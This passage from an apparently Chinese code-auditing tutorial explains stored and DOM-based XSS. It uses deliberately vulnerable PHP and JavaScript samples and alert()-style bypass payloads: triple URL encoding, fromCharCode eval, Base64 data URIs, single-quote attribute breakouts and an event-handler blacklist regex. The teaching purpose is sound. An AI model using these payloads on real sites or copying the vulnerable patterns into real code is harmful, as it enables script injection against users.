\u4E0A\u8FF0\u4EE3\u7801\u4F7F\u7528HTTP\u7684POST\u65B9\u5F0F\u4F20\u9012\u53C2\u6570btnSign\u3001mtxMessage\u3001txtName\u3002mtxMessage\u53C2\u6570\u4F7F\u7528\u7684\u8FC7\u6EE4\u51FD\u6570\u5305\u62EC\uFF1Atrim\u3001stripslashes\u3001mysql_real_escape_string\u3002txtName\u53C2\u6570\u4F7F\u7528\u7684\u8FC7\u6EE4\u51FD\u6570\u5305\u62EC\uFF1Atrim\u3001mysql_real_escape_string\u3002\r
\r
l trim(string,charlist)\uFF1A\u79FB\u9664string\u5B57\u7B26\u4E24\u4FA7\u7684\u9884\u5B9A\u4E49\u5B57\u7B26\uFF0C\u9884\u5B9A\u4E49\u5B57\u7B26\u5305\u62EC\uFF1A\\t \u3001 \\n \u3001\\x0B \u3001\\r\u4EE5\u53CA\u7A7A\u683C\uFF0C\u53EF\u9009\u53C2\u6570charlist\u652F\u6301\u6DFB\u52A0\u989D\u5916\u9700\u8981\u5220\u9664\u7684\u5B57\u7B26\u3002\r
\r
l stripslashes(string)\uFF1A\u53BB\u9664\u6389string\u5B57\u7B26\u7684\u53CD\u659C\u6760\uFF3C\u3002\r
\r
l mysqli_real_escape_string(string,connection)\uFF1A\u51FD\u6570\u4F1A\u5BF9\u5B57\u7B26\u4E32string\u4E2D\u7684\u7279\u6B8A\u7B26\u53F7\uFF08\\x00\uFF0C\\n\uFF0C\\r\uFF0C\\\uFF0C\u2018\uFF0C\u201C\uFF0C\\x1a\uFF09\u8FDB\u884C\u8F6C\u4E49\u3002\r
\r
\u4E0A\u8FF0\u51FD\u6570\u65E0\u6CD5\u9632\u5FA1XSS\u7684Payload\uFF1A<script>alert(1)<\/script>\uFF0C\u56E0\u6B64\u53EF\u4EE5\u901A\u8FC7\u53C2\u6570mtxMessage\u548CtxtName\u5B58\u50A8\u6076\u610F\u811A\u672C\u5230guestbook\u6570\u636E\u5E93\u4E2D\u3002\u5F53\u89E6\u53D1\u524D\u53F0\u9875\u9762\u65F6\uFF0C\u6076\u610FJS\u811A\u672C\u5C06\u88AB\u52A0\u8F7D\u5E76\u901A\u8FC7\u9875\u9762\u6267\u884C\u3002\r
\r
\uFF083\uFF09  \u5229\u7528\u65B9\u6CD5\uFF1A\r
\r
  \u4F20\u9012\u53C2\u6570mtxMessage\u6216txtName\u7684\u6076\u610F\u811A\u672C\u4E3A<script>alert(1)<\/script>\u3002\r
\r
### 4.2.5 DOM\u578BXSS\u6F0F\u6D1E\r
\r
DOM\u578BXSS\u6F0F\u6D1E\u4E3B\u8981\u662F\u5229\u7528\u4E86JavaScript\u7684Document Object Model\uFF08\u7B80\u79F0DOM\uFF09\u8282\u70B9\u7F16\u7A0B\uFF0C\u5B83\u53EF\u4EE5\u6539\u53D8HTML\u4EE3\u7801\u7684\u7279\u6027\u800C\u5F62\u6210XSS\u653B\u51FB\u3002\u4E0D\u540C\u4E8E\u4E4B\u524D\u4ECB\u7ECD\u7684\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\uFF0CDOM XSS\u662F\u901A\u8FC7URL\u53C2\u6570\u53BB\u63A7\u5236\u89E6\u53D1\u7684\uFF0C\u56E0\u6B64\u5B83\u4E5F\u5C5E\u4E8E\u53CD\u5C04\u578BXSS\u3002\r
\r
\u4E0B\u9762\u4ECB\u7ECDHTML DOM\u5E38\u89C1\u5C5E\u6027\u4E0E\u65B9\u6CD5\uFF0C\u8FD9\u4E9B\u65B9\u6CD5\u4F20\u9012\u7684\u53C2\u6570\u90FD\u53EF\u80FD\u51FA\u73B0DOM\u578BXSS\u6F0F\u6D1E\u3002\r
\r
\u4E00\u4E9B\u5E38\u7528\u7684 HTML DOM \u65B9\u6CD5\uFF1A\r
\r
\xB7  getElementById(id)\uFF1A\u83B7\u53D6\u5E26\u6709\u6307\u5B9A id \u7684\u8282\u70B9\uFF08\u5143\u7D20\uFF09\uFF1B\r
\r
\xB7  appendChild(node)\uFF1A\u63D2\u5165\u65B0\u7684\u5B50\u8282\u70B9\uFF08\u5143\u7D20\uFF09\uFF1B\r
\r
\xB7  removeChild(node)\uFF1A\u5220\u9664\u5B50\u8282\u70B9\uFF08\u5143\u7D20\uFF09\u3002\r
\r
\u4E00\u4E9B\u5E38\u7528\u7684 HTML DOM \u5C5E\u6027\uFF1A\r
\r
\xB7  innerHTML\uFF1A\u8282\u70B9\uFF08\u5143\u7D20\uFF09\u7684\u6587\u672C\u503C\uFF1B\r
\r
\xB7  parentNode\uFF1A\u8282\u70B9\uFF08\u5143\u7D20\uFF09\u7684\u7236\u8282\u70B9\uFF1B\r
\r
\xB7  childNodes\uFF1A\u8282\u70B9\uFF08\u5143\u7D20\uFF09\u7684\u5B50\u8282\u70B9\uFF1B\r
\r
\xB7  attributes\uFF1A\u8282\u70B9\uFF08\u5143\u7D20\uFF09\u7684\u5C5E\u6027\u8282\u70B9\u3002\r
\r
\u8BE5\u7C7B\u578B\u653B\u51FB\u9700\u8981\u653B\u51FB\u8005\u5BF9\u5177\u4F53\u7684JS DOM\u4EE3\u7801\u8FDB\u884C\u5206\u6790\uFF0C\u5E76\u6839\u636E\u5B9E\u9645\u60C5\u51B5\u8FDB\u884CXSS\u6F0F\u6D1E\u5229\u7528\u3002\u7531\u4E8EDOM XSS\u653B\u51FB\u8F7D\u8377\u6784\u9020\u96BE\u5EA6\u8F83\u5927\u4E14\u8BE5\u6F0F\u6D1E\u5229\u7528\u65B9\u5F0F\u82DB\u523B\uFF0C\u4F7F\u5F97\u8BE5\u6F0F\u6D1E\u5E94\u7528\u4E0D\u5E7F\u6CDB\u3002\r
\r
\uFF081\uFF09  \u65E0\u8FC7\u6EE4DOM\u578BXSS\u7684\u5BA1\u8BA1\u4EE3\u7801\u6848\u4F8B\u5982\u4E0B\uFF1A\r
\r
\r
\r
<html>\r
\r
<head><title>DOM XSS</title><meta charset="utf-8"></head>\r
\r
<body>\r
\r
   <div id="domarea"></div>                          //domarea\u5143\u7D20\r
\r
  <FORM action="" method="post">\r
\r
\u200B    <input type="text" id="dom" value="\u8F93\u5165">  //dom\u5143\u7D20\r
\r
\u200B    <input type="button" value="\u66FF\u6362" onclick="domfuc()">\r
\r
  </FORM>\r
\r
</body>\r
\r
<script>\r
\r
function domfuc(){\r
\r
**document.getElementById("domarea").innerHTML = document.getElementById("dom").value;** }\r
\r
//\u5C06domarea\u5143\u7D20\u7684\u503C\u66FF\u6362\u4E3Adom\u5143\u7D20\u7684\u503C\r
\r
<\/script>\r
\r
</html>\r
\r
\r
\r
\uFF082\uFF09  \u5206\u6790\u6F0F\u6D1E\uFF1A\r
\r
\u8BE5\u4EE3\u7801\u7531HTML\u4E2D\u7684FORM\u8868\u5355\u4E0EJS\u51FD\u6570domfuc\u7EC4\u6210\uFF0C\u5F53\u8F93\u5165\u5185\u5BB9\u70B9\u51FB\u201C\u66FF\u6362\u201D\u540E\uFF0C\u5F00\u59CB\u89E6\u53D1\u8C03\u7528domfuc\u51FD\u6570\uFF0C\u800C\u8BE5\u51FD\u6570\u7684\u5185\u5BB9\u662F\u201Cdocument.getElementById("domarea").innerHTML = document.getElementById("dom").value;\u201D\u5C06HTML\u4E2D\u7684domarea\u8282\u70B9\u4FEE\u6539\u4E3Adom\u8282\u70B9\u503C\uFF0C\u800Cdom\u8282\u70B9\u7684\u503C\u4E3AFORM\u8868\u5355\u4E2D\u7684\u8F93\u5165\u5185\u5BB9\uFF0C\u7531\u4E8E\u5BF9\u7528\u6237\u8F93\u5165\u5185\u5BB9\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF0C\u4F7F\u5F97\u6076\u610F\u4EE3\u7801\u88AB\u6267\u884C\uFF0C\u8BE5\u8F93\u5165\u5185\u5BB9\u6539\u53D8\u4E86HTML\u4E2D\u7684\u8282\u70B9\u3002\r
\r
\uFF083\uFF09  \u5229\u7528\u65B9\u6CD5\uFF1A\r
\r
  \u8BE5\u8F93\u5165\u6846\u5B58\u5728DOM\u578BXSS\u6F0F\u6D1E\uFF0C\u5F53\u8F93\u5165\u5185\u5BB9\u201C<img src=x onerror='alert(/hacker/)'>\u201D\uFF0C\u5355\u51FB\u201C\u66FF\u6362\u201D\u6309\u94AE\uFF0C\u9875\u9762\u5F39\u51FA\u6D88\u606F\u6846\uFF0C\u5982\u56FE4-3\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image232.gif)\r
\r
\u56FE4-3 DOM\u578BXSS\u6D4B\u8BD5\u56FE\r
\r
## 4.3 XSS\u6F0F\u6D1E\u7ED5\u8FC7\r
\r
  \u4E3A\u4E86\u9632\u5FA1XSS\u6F0F\u6D1E\u7684\u653B\u51FB\uFF0C\u5F88\u591ACMS\u5728\u5F00\u53D1\u65F6\u5C06\u4F7F\u7528\u5404\u79CD\u65B9\u6CD5\uFF0C\u4F8B\u5982\uFF1A\u51FD\u6570htmlspecialchars\u3001\u9ED1\u767D\u540D\u5355\u3001\u6B63\u5219\u8868\u8FBE\u5F0F\u7B49\u3002\u4F46\u662F\u7531\u4E8EXSS\u6F0F\u6D1E\u7684\u653B\u51FB\u65B9\u5F0F\u8FC7\u4E8E\u591A\u6837\uFF0C\u4E5F\u5B58\u5728\u5F88\u591A\u7ED5\u8FC7\u7684\u60C5\u51B5\u3002\u672C\u5C0F\u8282\u5C06\u4ECB\u7ECD\u56DB\u79CD\u5E38\u89C1\u7684\u7ED5\u8FC7\u60C5\u51B5\uFF0C\u5305\u62EC\uFF1A\u7F16\u89E3\u7801\u7ED5\u8FC7\u3001HTML\u7F16\u5199\u4E0D\u89C4\u8303\u7ED5\u8FC7\u3001\u9ED1\u540D\u5355\u7ED5\u8FC7\u3001\u5BBD\u5B57\u8282\u6CE8\u5165XSS\u3002\r
\r
### 4.3.1 \u7F16\u89E3\u7801\u7ED5\u8FC7\r
\r
\u5728\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\uFF0C\u7531\u4E8E\u7531\u9875\u9762\u4E0E\u5B9E\u9645\u73AF\u5883\u7684\u591A\u6837\u6027\uFF0C\u5BFC\u81F4XSS\u6F0F\u6D1E\u5F88\u96BE\u6709\u6548\u7684\u9632\u5FA1\u3002\u968F\u7740\u6D4F\u89C8\u5668\u53CA\u5177\u4F53\u573A\u666F\u4E0D\u540C\uFF0C\u5F88\u591AXSS Payload\u90FD\u53EF\u6839\u636E\u5177\u4F53\u573A\u666F\uFF0C\u901A\u8FC7\u4F7F\u7528\u4E0D\u540C\u7F16\u7801\u7ED5\u8FC7htmlspecialchars\u4FDD\u62A4\u51FD\u6570\uFF08\u8BE5\u4FDD\u62A4\u51FD\u6570\u5177\u4F53\u542B\u4E49\u8BE6\u89C14.4\u8282\uFF09\u3002\r
\r
\u9664\u6B64\u4E4B\u5916\uFF0C\u7A0B\u5E8F\u5F00\u53D1\u8FC7\u7A0B\u4E2D\u7684\u7F16\u89E3\u7801\u4E0E\u9632\u5FA1\u51FD\u6570\u8C03\u7528\u903B\u8F91\u4E0D\u5F53\uFF0C\u4E5F\u53EF\u80FD\u5BFC\u81F4\u7ED5\u8FC7\u9632\u5FA1\u51FD\u6570htmlspecialchars\u7684\u60C5\u51B5\u3002\u5BF9\u4E8E\u7F16\u7801\u95EE\u9898\u800C\u8A00\uFF0C\u5E38\u89C1\u7684\u7F16\u7801\u7ED5\u8FC7\u60C5\u51B5\u6709\u5F88\u591A\u79CD\u7C7B\u578B\uFF0C\u5305\u62EC\uFF1AURL\u7F16\u7801\u3001Unicode\u7F16\u7801\u3001Base64\u7F16\u7801\u3001Javascript\u4F2A\u534F\u8BAE\u7B49\u3002\r
\r
\uFF081\uFF09  URL\u7F16\u7801\u7ED5\u8FC7\r
\r
l \u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$a=urldecode($_GET['id']); //\u63A5\u6536\u53C2\u6570\u5E76\u8FDB\u884Curl\u89E3\u7801\r
\r
$b=htmlspecialchars($a);  //HTML ENCODE\u5904\u7406,\u5230\u8FD9\u91CC\u90FD\u662F\u6CA1\u6709\u95EE\u9898\u7684\r
\r
echo urldecode($b);    //\u6700\u540E\uFF0Curl\u89E3\u7801\u8F93\u51FA\r
\r
?>\r
\r
\r
\r
l \u5206\u6790\u6F0F\u6D1E\uFF1A\r
\r
\u4EE3\u7801\u903B\u8F91\u4E2D\uFF0C\u9996\u5148\u5BF9\u4F20\u9012\u53C2\u6570\u8FDB\u884CURL\u89E3\u7801\uFF0C\u7136\u540E\u8C03\u7528\u51FD\u6570htmlspecialchars\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u518D\u8C03\u7528urldecode\u51FD\u6570\u5BF9\u8FC7\u6EE4\u53C2\u6570\u8FDB\u884CURL\u89E3\u7801\u3002\u7531\u4E8E\u6700\u540E\u8C03\u7528urldecode\u8FDB\u884C\u89E3\u7801\u8F93\u51FA\u5C06\u5BFC\u81F4\u5B58\u5728\u4E09\u91CDURL\u7F16\u7801\u7ED5\u8FC7\u60C5\u51B5\u3002\r
\r
Payload\u539F\u578B\u4E3A<script>alert(/xss/)<\/script>\uFF0C\u7ECF\u8FC7\u4E09\u6B21URL\u7F16\u7801\u540E\u7ED3\u679C\u4E3A\uFF1A\r
\r
id=%25253Cscript%25253Ealert(/xss/)%25253C/script%25253E\r
\r
l \u5229\u7528\u6D4B\u8BD5\uFF1A\r
\r
\u901A\u8FC7\u4E09\u6B21URL\u7F16\u7801\u7684Payload\u6210\u529F\u7ED5\u8FC7htmlspecialchars\u9632\u5FA1\uFF0C\u6267\u884C\u6076\u610F\u811A\u672C\u3002\u5728\u5B9E\u9645\u60C5\u51B5\u4E0B\uFF0CHTML ENCODE\u5904\u7406\u540E\u76F4\u63A5\u8F93\u51FA\u53D8\u91CF\uFF0C\u65E0\u9700\u518D\u6B21URL\u89E3\u7801\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image234.jpg)\r
\r
\u56FE4-4 URL\u7F16\u7801\u7ED5\u8FC7\u6D4B\u8BD5\u56FE\r
\r
l URL\u7F16\u7801\u7684Payload\r
\r
<iframe src=\u201Djavascript:alert(1)\u201D>test</iframe>\r
\r
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>\r
\r
<a href="javascript:%61%6c%65%72%74%28%31%29">xx</a>\r
\r
\uFF082\uFF09  Unicode\u7F16\u7801\u7ED5\u8FC7\r
\r
\u5728\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u6709\u4E9BWeb\u7A0B\u5E8F\u8FC7\u6EE4\u4E86\u67D0\u4E9B\u5B57\u7B26\u4E32\uFF0C\u4F46\u662F\u53D1\u73B0\u8FD9\u4E2A\u7AD9\u70B9\u5728\u540E\u7AEF\u9A8C\u8BC1\u5B57\u7B26\u4E32\u7684\u65F6\u5019\uFF0C\u8BC6\u522BUnicode\u7F16\u7801\u3002\u90A3\u5C31\u53EF\u4EE5\u628APayload\u6765\u6539\u6210Unicode\u7F16\u7801\u5F62\u5F0F\uFF0C\u5C31\u53EF\u4EE5\u7ED5\u8FC7\u7AD9\u70B9\u8FC7\u6EE4\u673A\u5236htmlspecialchars\u3002\r
\r
l \u6D4B\u8BD5Payload\uFF1A\r
\r
\`\`\`\r
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))<\/script>\r
\`\`\`\r
\r
l \u539F\u7406\uFF1A\r
\r
JS\u4E2Deval\u51FD\u6570\u53EF\u4EE5\u5C06\u53C2\u6570\u4E2D\u5B57\u7B26\u4E32\u6309\u7167\u4EE3\u7801\u6267\u884C\u3002String.fromCharCode\u53EF\u4EE5\u5C06\u53C2\u6570\u4E2D\u7684Unicode\u503C\u8F6C\u5316\u4E3A\u5BF9\u5E94\u5B57\u7B26\u4E32\uFF1A97,108,101,114,116,40,39,120,115,115,39,41\u901A\u8FC7Unicode\u89E3\u7801\u4E3Aalert('xss')\u3002\r
\r
\uFF083\uFF09  Base64\u7F16\u7801\u7ED5\u8FC7\r
\r
\u5728\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0CXSS\u6F0F\u6D1E\u8FD8\u5B58\u5728Base64\u7F16\u7801\u7ED5\u8FC7\u7684\u60C5\u51B5\uFF0C\u8BE5\u60C5\u51B5\u5927\u591A\u6570\u6709\u4E24\u79CD\u7C7B\u578B\uFF0C\u5305\u62EC\uFF1A<a href=\u201D\u53EF\u63A7\u70B9\u201D>\u548C<iframe src=\u201D\u53EF\u63A7\u70B9\u201D>\u3002\r
\r
l a\u6807\u7B7EPayload\r
\r
<a href=\u201Cdata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\u201D>test</a>\r
\r
\u8FD9\u6837\u5F53\u94FE\u63A5\u88AB\u70B9\u51FB\u65F6\uFF0C\u5C31\u4F1A\u4EE5data\u534F\u8BAE\uFF0C\u9875\u9762\u4EE5html/text\u7684\u65B9\u5F0F\u89E3\u6790\u7F16\u7801\u4E3Abase64 \u5176\u4E2DPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\u7ECF\u8FC7Base64\u89E3\u7801\u4E3A<scirpt>alert(1)<\/script>\r
\r
l iframe\u6807\u7B7EPayload\r
\r
<iframe src=\u201Cdata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\u201D>\r
\r
</iframe>\u5176\u539F\u7406\u4E0Ea\u6807\u7B7E\u7C7B\u4F3C\u3002\r
\r
### 4.3.2 HTML\u7F16\u5199\u4E0D\u89C4\u8303\u7ED5\u8FC7\r
\r
\u5728\u4EE3\u7801\u5F00\u53D1\u8FC7\u7A0B\u4E2D\uFF0C\u7531\u4E8EHTML\u4EE3\u7801\u7F16\u5199\u4E0D\u89C4\u8303\uFF08\u4E0D\u4F7F\u7528\u53CC\u5F15\u53F7\u4FDD\u62A4\u5143\u7D20\u503C\uFF09\uFF0C\u5C06\u5BFC\u81F4Payload\u53EF\u7ED5\u8FC7htmlspecialchars\u8FC7\u6EE4\u51FD\u6570\u3002\u5176\u4E3B\u8981\u539F\u56E0\u662Fhtmlspecialchars\u51FD\u6570\u5728\u9ED8\u8BA4\u60C5\u51B5\u4E0B\u4E0D\u80FD\u8FC7\u6EE4\u5355\u5F15\u53F7\uFF0C\u5F88\u591AXSS Payload\u53EF\u901A\u8FC7\u95ED\u5408HTML\u6807\u7B7E\u53CA\u901A\u8FC7\u4E8B\u4EF6\u6807\u7B7E\u89E6\u53D1\u6267\u884C\u6076\u610F\u811A\u672C\u3002\r
\r
l \u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
   $name = **htmlspecialchars**($_GET['name']); ?>\r
\r
<input type='text' class='search' value=**'<?=$name?>'**>\r
\r
\r
\r
l \u5206\u6790\u6F0F\u6D1E\uFF1A\r
\r
\u901A\u8FC7HTTP\u7684GET\u65B9\u5F0F\u83B7\u53D6\u53C2\u6570\uFF0C\u5728\u4E00\u4E2Ainput\u5143\u7D20\u7684\u5C5E\u6027\u91CC\u8F93\u51FA\u8FD9\u4E2A\u53D8\u91CF\uFF0C\u4E14\u8BE5\u6807\u7B7E\u5185\u4F7F\u7528\u5355\u5F15\u53F7\u95ED\u5408\u4FDD\u62A4\u3002\u4F46\u662Fhtmlspecialchars\u51FD\u6570\u9ED8\u8BA4\u53EA\u662F\u8F6C\u5316\u53CC\u5F15\u53F7\uFF08\u201D\uFF09, \u4E0D\u5BF9\u5355\u5F15\u53F7\uFF08\u2019\uFF09\u505A\u8F6C\u4E49\u3002\u56E0\u6B64\uFF0CXSS \u7684payload\u53EF\u4EE5\u7528\u5355\u5F15\u53F7\u95ED\u5408\u6267\u884C\u6076\u610F\u811A\u672C\u3002\r
\r
Payload\u4E3A\uFF1A http://ip/a.php?name=222' onclick='alert(/xxs/)\r
\r
\u4E0A\u8FF0Payload\u7ECF\u8FC7htmlspecialchars\u8FC7\u6EE4\u540E\u65E0\u6548\uFF0C\u62FC\u63A5\u540E\u7684input\u6807\u7B7E\u5185\u5BB9\u4E3A<input type='text' class='search' value='222' onclick='alert(/xxs/)'>\r
\r
l \u5229\u7528\u6D4B\u8BD5\uFF1A\r
\r
\u6784\u9020\u65E0\u53CC\u5F15\u53F7\u7B49\u6807\u7B7E\u7684\u4E8B\u4EF6\u89E6\u53D1\u7C7B\u578BPayload\u6210\u529F\u7ED5\u8FC7htmlspecialchars\u9632\u5FA1\uFF0C\u6267\u884C\u6076\u610F\u811A\u672C\uFF0C\u5982\u56FE4-5\u6240\u793A\u3002\u9488\u5BF9\u8FD9\u79CD\u60C5\u51B5\u7684\u4FEE\u590D\u5B89\u5168\u5EFA\u8BAE\uFF1A\u5C06HTML\u6807\u7B7E\u7684\u5C5E\u6027\u503C\u7528\u53CC\u5F15\u53F7\u4FDD\u62A4\uFF0C\u800C\u4E0D\u4F7F\u7528\u5355\u5F15\u53F7\u4FDD\u62A4\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image236.gif)\r
\r
\u56FE4-5 \u7ED5\u8FC7htmlspecailchars\u9632\u5FA1\u56FE\r
\r
### 4.3.3 \u9ED1\u540D\u5355\u8FC7\u6EE4\u7ED5\u8FC7\r
\r
\u5728\u4EE3\u7801\u5F00\u53D1\u8FC7\u7A0B\u4E2D\uFF0C\u4E3A\u4E86\u9632\u5FA1XSS\u653B\u51FB\uFF0C\u5F88\u591A\u7A0B\u5E8F\u901A\u8FC7\u5728\u5168\u5C40\u5F15\u5165\u8FC7\u6EE4\u51FD\u6570\uFF0C\u63D0\u4F9B\u9ED1\u540D\u5355\u8FC7\u6EE4XSS\u7684Payload\u3002\r
\r
\u8FC7\u6EE4\u65B9\u5F0F\u5305\u62EC\u4E24\u79CD\uFF1A\u8FC7\u6EE4\u5E38\u89C1\u6807\u7B7E\uFF1B\u4F7F\u7528\u6B63\u5219\u8868\u8FBE\u5F0F\u8FC7\u6EE4\u3002\r
\r
\uFF081\uFF09  \u5BF9\u4E8E\u5E38\u89C1\u6807\u7B7E\u800C\u8A00\uFF0C\u7531\u4E8EXSS\u6F0F\u6D1E\u53D8\u5316\u591A\u6837\uFF0C\u5E38\u89C1\u6807\u7B7E\u8FC7\u6EE4\u5F88\u96BE\u5B8C\u5168\u62B5\u5FA1XSS\u3002\r
\r
\uFF082\uFF09  \u5BF9\u4E8E\u6B63\u5219\u8868\u8FBE\u5F0F\u800C\u8A00\uFF0C\u6709\u5F88\u591ACMS\u90FD\u5B58\u5728\u7531\u4E8E\u6B63\u5219\u8868\u8FBE\u5F0F\u4E66\u5199\u4E0D\u4E25\u8C28\u5BFC\u81F4\u7684XSS Payload\u7ED5\u8FC7\u6B63\u5219\u8868\u8FBE\u5F0F\u3002\r
\r
l \u7ED5\u8FC7\u5E38\u89C1\u6807\u7B7E\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
  $name = htmlspecialchars($_GET['name']);//\u5BF9GET\u4F20\u9012\u7684\u503C\u8FDB\u884CHTML\u5B9E\u4F53\u8F6C\u7801\r
\r
  $pregs = "**/<script>|<\\/script>|onclick|oncontextmenu|ondblclick|onmousedown|onmouseenter|onmouseleave|onmousemove|onmouseover|onmouseout|onmouseup|onkeydown|onkeypress|onkeyup/i**";//\u5B9A\u4E49\u9ED1\u540D\u5355\u5173\u952E\u5B57\r
\r
  $check = preg_match($pregs, $name);//\u5339\u914D\u5173\u952E\u5B57\uFF0C\u8FD4\u56DEtrue\u6216false\r
\r
  if ($check) {\r
\r
\u200B      echo 'not found';\r
\r
\u200B      exit;}?>\r
\r
<input type='text' class='search' value='<?=$name?>'>\r
\r
\r
\r
l \u5206\u6790\u6F0F\u6D1E\uFF1A\r
\r
\u4F7F\u7528\u9ED1\u540D\u5355\u7684\u65B9\u5F0F\u53EF\u4EE5\u5728\u4E00\u5B9A\u7A0B\u5EA6\u4E0A\u589E\u52A0XSS\u7684\u9632\u5FA1\u6027\uFF0C\u4F46\u662F\u8FD9\u5E76\u4E0D\u5168\u9762\u3002\u4E0A\u8FF0\u4EE3\u7801\u4E2D\u4F7F\u7528\u9ED1\u540D\u5355\u5BF9\u5E38\u89C1\u7684\u4E8B\u4EF6\u7C7B\u578B\u6807\u7B7E\u8FDB\u884C\u8FC7\u6EE4\u3002\u4F46\u662F\u57FA\u4E8EXSS\u7684Payload\u4E8B\u4EF6\u6807\u7B7E\u81F3\u4ECA\u6709105\u4E2A\uFF0C\u4F7F\u7528\u9ED1\u540D\u5355\u660E\u663E\u4E0D\u591F\u4E25\u8C28\u3002\r
\r
Payload\uFF1A?name=111' onfocus='alert(/xss/)\r
\r
\u4E0A\u8FF0Payload\u7ECF\u8FC7htmlspecialchars\u8FC7\u6EE4\u540E\u65E0\u6548\uFF0C\u62FC\u63A5\u540E\u7684input\u6807\u7B7E\u5185\u5BB9\u4E3A<input type='text' class='search' value='111' onfocus='alert(/xxs/)'>\uFF0C\u6D4B\u8BD5\u7ED3\u679C\u5982\u56FE4-6\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image238.gif)\r
\r
\u56FE4-6 \u9ED1\u540D\u5355\u7ED5\u8FC7\u6D4B\u8BD5\u56FE\r
\r
\u6700\u540E\u7ED9\u51FA\u5E38\u89C1\u7684\u57FA\u4E8E\u4E8B\u4EF6XSS\u6807\u7B7E\uFF0C\u5982\u88684-1\u6240\u793A\u3002\r
\r
\u88684-1 XSS\u6807\u7B7E\u56FE\r
\r
| \u6807\u7B7E         | \u89E3\u91CA                                                     | \u6807\u7B7E        | \u89E3\u91CA                                   |\r
| ------------ | -------------------------------------------------------- | ----------- | -------------------------------------- |\r
| onAbort()    | \u5F53\u7528\u6237\u4E2D\u6B62\u52A0\u8F7D\u56FE\u7247\u65F6                                     | onError()   | \u5728\u52A0\u8F7D\u6587\u6863\u6216\u56FE\u50CF\u65F6\u53D1\u751F\u9519\u8BEF             |\r
| onActivate() | \u5F53\u5BF9\u8C61\u6FC0\u6D3B\u65F6                                             | onFocus()   | \u5F53\u7A97\u53E3\u83B7\u5F97\u7126\u70B9\u65F6\u653B\u51FB\u8005\u53EF\u4EE5\u6267\u884C\u653B\u51FB\u4EE3\u7801 |\r
| onClick()    | \u8868\u5355\u4E2D\u70B9\u51FB\u89E6\u53D1                                           | onMessage() | \u5F53\u9875\u9762\u6536\u5230\u4E00\u4E2A\u4FE1\u606F\u65F6\u89E6\u53D1\u4E8B\u4EF6           |\r
| onCopy()     | \u7528\u6237\u9700\u8981\u590D\u5236\u4E00\u4E9B\u4E1C\u897F\u6216\u4F7F\u7528execCommand("Copy")\u547D\u4EE4\u65F6\u89E6\u53D1) | onMove()    | \u7528\u6237\u6216\u653B\u51FB\u8005\u79FB\u52A8\u9875\u9762\u65F6\u89E6\u53D1             |\r
| onDrop()     | \u5F53\u62D6\u52A8\u5143\u7D20\u653E\u7F6E\u5728\u76EE\u6807\u533A\u57DF\u65F6\u89E6\u53D1                           | onSeek()    | \u5F53\u7528\u6237\u5728\u5143\u7D20\u4E0A\u6267\u884C\u67E5\u627E\u64CD\u4F5C\u65F6\u89E6\u53D1       |\r
\r
l \u7ED5\u8FC7\u5E38\u89C1\u6807\u7B7E\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
\`\`\`\r
//\u67D0CMS\u7684\u524D\u53F0JS\u4EE3\u7801\u8FC7\u6EE4\u90AE\u7BB1\u6B63\u5219\u8868\u8FBE\u5F0F\r
var pattern = /^([a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+(.\\D)+/;\r
\`\`\`\r
\r
\r
\r
l \u5206\u6790\u6F0F\u6D1E\uFF1A\r
\r
\u6B63\u5219\u8868\u793A\u5F0F\u5E38\u7528\u7B26\u53F7\u5982\u88684-2\u6240\u793A\u3002\r
\r
\u88684-2 \u6B63\u5219\u8868\u8FBE\u5F0F\u7B26\u53F7\u8868\r
\r
| \u7B26\u53F7     | \u89E3\u91CA               | \u7B26\u53F7     | \u89E3\u91CA                     |\r
| -------- | ------------------ | -------- | ------------------------ |\r
| ^        | \u6B63\u5219\u8868\u8FBE\u5F0F\u5F00\u5934     | &        | \u6B63\u5219\u8868\u8FBE\u5F0F\u7ED3\u5C3E           |\r
| \\d \\w \\s | \u5339\u914D\u6570\u5B57 \u5B57\u7B26 \u7A7A\u683C | \\D \\W \\S | \u5339\u914D\u975E\u6570\u5B57 \u975E\u5B57\u7B26 \u975E\u7A7A\u683C |\r
| [a-z]    | \u5339\u914Da\u5230z\u7684\u4E00\u4E2A\u5B57\u6BCD | [^abc]   | \u5339\u914D\u9664\u4E86abc\u7684\u5176\u4ED6\u5B57\u6BCD    |\r
| ?        | 0\u6B21\u62161\u6B21\u5339\u914D       | +        | \u5339\u914D1\u6B21\u6216\u591A\u6B21            |\r
| {n}      | \u5339\u914Dn\u6B21            | {n,}     | \u5339\u914Dn\u6B21\u4EE5\u4E0A              |\r
| {m,n}    | \u5339\u914D\u6700\u5C11m\u6B21\u6700\u591An\u6B21 | .        | \u9664\u6362\u884C\u7B26\u4EE5\u5916\u6240\u6709\u5B57\u7B26     |\r
\r
